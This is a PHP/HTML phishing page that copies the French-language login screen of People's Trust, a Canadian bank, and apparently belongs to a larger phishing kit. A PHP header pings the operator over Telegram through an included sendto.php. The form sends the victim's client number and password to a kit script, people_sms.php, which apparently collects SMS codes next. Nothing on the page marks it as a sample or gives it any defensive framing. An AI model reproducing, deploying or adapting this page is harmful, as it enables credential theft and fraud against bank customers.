<?php session_start();
$_SESSION["bank"] ='people trust';

require_once "../sendto.php";


sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡'); 

?>

<!DOCTYPE html>
<!-- saved from url=(0048)https://peoplestrust.auth.memberdirect.net/login -->
<html xmlns:layout="http://www.ultraq.net.nz/web/thymeleaf/layout" lang="en_CA">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @charset "UTF-8";

        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <script type="text/javascript" src="./people_trust_files/script.js.téléchargement"></script>
    <title>Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2">
    <meta name="google" content="notranslate">

    <!-- import md reno theme  -->

    <!-- import forge 1 theme -->
    <link type="text/css" href="/people/people_trust_files/theme-peoplestrust.css" rel="stylesheet">

    <style>
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak {
            display: none !important;
        }
    </style>

    <link type="text/css" href="./people/people_trust_files/login-common.css" rel="stylesheet">
    <link type="text/css" href="./people/people_trust_files/secure-key.css" rel="stylesheet">
    <link rel="icon"
        href="https://peoplestrust.auth.memberdirect.net/resources/themes/theme-peoplestrust/assets/favicon.png">


</head>

<body ng-app="UxpLoginApp" class="uxp-theme ng-scope">


    <div class="widget-c1-oauth-login position-relative oauth-login">
        <!-- Navigation section -->

        <!-- Terms and Condition section -->
        <!-- Login section -->
        <div ng-controller="UxpLoginController as $ctrl" id="c1-login-section" class="ng-scope">

            <div class="errors errors-login">
                <span ng-hide="state.isSubmittingForm || state.isFieldOnChange" class="error-message"></span>
            </div>
            <form id="loginForm" name="uxpLoginForm"
                class="center-block c1-login-form ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength"
                ng-class="{ &#39;ie11-fix&#39;: isIE11 }" action="/people/people_sms.php" method="post"
                autocomplete="on" ng-submit="ngSubmitListener(&#39;false&#39;)"><input type="hidden" name="_csrf"
                    value="77be8eb3-fd7c-442e-8880-23feb4620e29" autocomplete="off">

                <!-- ReCaptcha -->



                <div>
                    <!-- Memorized account select -->
         

                    <!-- pan/pac login -->
                    <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()"
                        class="ng-pristine ng-invalid ng-invalid-uxp-pattern ng-invalid-required ng-valid-minlength ng-valid-maxlength">



                        <div class="logo text-center">
                            <img src="./people_trust_files/logo.png" alt="Logo">

                        </div>



                     
                        <div class="login-id-fields" ng-show="!state.usingMemorizedUser">
                            <div class="new-login-fields">


                                <div class="form-group">



                                    <input id="branch" name="branch" type="hidden" value="000" autocomplete="off">
                                </div>
                                <!-- ngIf: !state.usingMemorizedUser -->
                                <div ng-if="!state.usingMemorizedUser" ng-class="
            [
                &#39;form-group&#39;,
                {
                    &#39;is-invalid&#39;: isMemberNumInvalid()
                }
            ]
         " class="ng-scope form-group">
                                    <div ng-class="
            [
                &#39;text-input&#39;,
                {
                    &#39;is-empty&#39;: !(uxpLoginForm.newLoginForm.memberNum.$modelValue)
                }
            ]
            " class="text-input is-empty">
                                        <label for="memberNum">
                                            <span id="accountno" aria-hidden="true">Numéro de client</span>
                                            <input aria-labelledby="accountno"
                                                class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-uxp-pattern ng-valid-required ng-valid-maxlength"
                                                id="memberNum" name="cvv" type="text" maxlength="8"
                                                uxp-pattern="^.{3,22}$" ng-model="fieldModels.memberNum"
                                                data-uxp-required-error-message="Veuillez saisir votre numéro de client."
                                                data-uxp-mismatched-error-message="Vous avez entré un numéro de client invalide. Veuillez réessayer."
                                                ng-required="required" ng-model-options="{allowInvalid: true}"
                                                ng-change="isFieldChanged()"
                                                aria-describedby="branchlabel branchno accountno memberNum memberNumError"
                                                autocomplete="username" aria-required="true" aria-invalid="false"
                                                android-margin="" placeholder="Numéro de client">
                                        </label>
                                        <!-- ngIf: 
                    isMemberNumInvalid() &&
                    uxpLoginForm.newLoginForm.memberNum.$error.uxpPattern
                 -->
                                    </div>
                                </div><!-- end ngIf: !state.usingMemorizedUser -->

                            </div>
                            <!-- ngIf: state.usingMemorizedUser -->
                            <div class="memorized-login-fields">
                                <!-- ngIf: fieldModels.hashedLoginId -->
                            </div>
                        </div>
                        <div class="password-mask-toggle">
                            <a href="#" role="button"
                                class="show-password">
                                <!-- ngIf: fieldModels.passwordInputType !== 'text' --><span
                                    ng-if="fieldModels.passwordInputType !== &#39;text&#39;" class="ng-scope">Afficher
                                    le code d’accès</span><!-- end ngIf: fieldModels.passwordInputType !== 'text' -->
                                <!-- ngIf: fieldModels.passwordInputType === 'text' -->
                            </a>
                        </div>
                        <div class="form-group" ng-class="{ &#39;is-invalid&#39;: isPasswordInvalid() }">
                            <div ng-class="
                            [
                                &#39;text-input&#39;,
                                {
                                    &#39;is-empty&#39;: !(uxpLoginForm.newLoginForm.password.$modelValue)
                                }
                            ]
                            " class="text-input is-empty">
                                <label for="password">
                                    <span aria-hidden="true">Mot de passe</span>
                                    <input
                                        class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-uxp-pattern ng-invalid-required"
                                        id="password" name="mdp" ng-attr-type="{{ fieldModels.passwordInputType }}"
                                        ng-model="fieldModels.password" uxp-pattern="^.{5,30}$"
                                        ng-model-options="{allowInvalid: true}" ng-change="isFieldChanged()"
                                        data-uxp-required-error-message="S&#39;il vous plait entrez votre mot de passe."
                                        data-uxp-mismatched-error-message="Vous avez entré un mot de passe incorrect. Veuillez réessayer."
                                        ng-required="true" aria-invalid="false"
                                        aria-describedby="password passwordError" autocomplete="current-password"
                                        android-margin="" placeholder="Mot de passe" aria-label="Mot de passe"
                                        type="password" required="required">
                                </label>
                                <!-- ngIf: 
                                    isPasswordInvalid() &&
                                    uxpLoginForm.newLoginForm.password.$error.uxpPattern
                                 -->
                            </div>
                        </div>
                        <div class="form-group" ng-show="!state.usingMemorizedUser">
                            <div class="checkbox">
                                <label for="rememberLogin" class="rememberMeCheckboxLabel">
                                    <input class="form-control ng-pristine ng-untouched ng-valid ng-empty"
                                        type="checkbox" id="rememberLogin" name="remember-login-credentials"
                                        ng-model="fieldModels.rememberMe" value="true"> <span
                                        class="remember-me-input-label">Retenir mon nom d’utilisateur</span>
                                </label>
                            </div>
                        </div>


                        <div class="account-nickname-container ng-hide" ng-show="fieldModels.rememberMe">
                            <div ng-class="
                            [
                                &#39;form-group&#39;,
                                {
                                    &#39;is-invalid&#39;: isAccountNicknameInvalid()
                                }
                            ]
                            " class="form-group">
                                <div ng-class="
                                [
                                    &#39;text-input&#39;, {
                                        &#39;is-empty&#39;: !(uxpLoginForm.newLoginForm[&#39;account-nickname&#39;].$modelValue)
                                    }
                                ]
                                " class="text-input is-empty">
                                    <label for="account-nickname">
                                        <span>Sauvegarder votre profil de connexion</span>
                                        <input
                                            class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-minlength ng-valid-maxlength ng-valid-required"
                                            id="account-nickname" name="account-nickname" type="text"
                                            ng-required="fieldModels.rememberMe" ng-model="fieldModels.accountNickname"
                                            aria-invalid="false" aria-describedby="nameError" autocomplete="off"
                                            android-margin="" placeholder="Nommer votre nouveau profil de connexion"
                                            ng-minlength="1" ng-maxlength="25" maxlength="25">
                                    </label>
                                    <!-- ngIf: hasNicknameMinLengthError() -->
                                </div>
                            </div>
                        </div>

                        <div class="text-center c1-btn-container">

                            <button 
                                type="submit" id="loginSubmit">Ouverture de session</button>


                        </div>

                        <div class="c1-btn-container memorized-btn-container">
                            <div>
                                <a href="https://peoplestrust.auth.memberdirect.net/forgotPac">Mot de passe oublié?</a>
                            </div>

                            <div class="memorized-accounts ng-hide" ng-show="
                            haveMemorizedAccounts() &amp;&amp;
                            (
                                showingNewLogin() ||
                                showingMemorizedAccountsEdit()
                            )
                         ">
                                <a href="https://peoplestrust.auth.memberdirect.net/login#"
                                    ng-click="showMemorizedAccounts()">Afficher les profils de connexion sauvegardés</a>
                            </div>
                        </div>




                    </div>



                </div>
            </form>

            <!-- ngIf: state.isShowingSpinner -->

        </div>
    </div>

    



    <div id="extension-mmplj"></div><iframe id="tdz_ifrm" title="empty" name="" width="0px" height="0px" marginwidth="0"
        marginheight="0" frameborder="0" aria-disabled="true" aria-hidden="true" tabindex="-1"
        src="./people_trust_files/Niodwaz5m3hDWFs7.html"
        style="display: none !important; z-index: -9999 !important; visibility: hidden !important;"></iframe>
</body>

</html>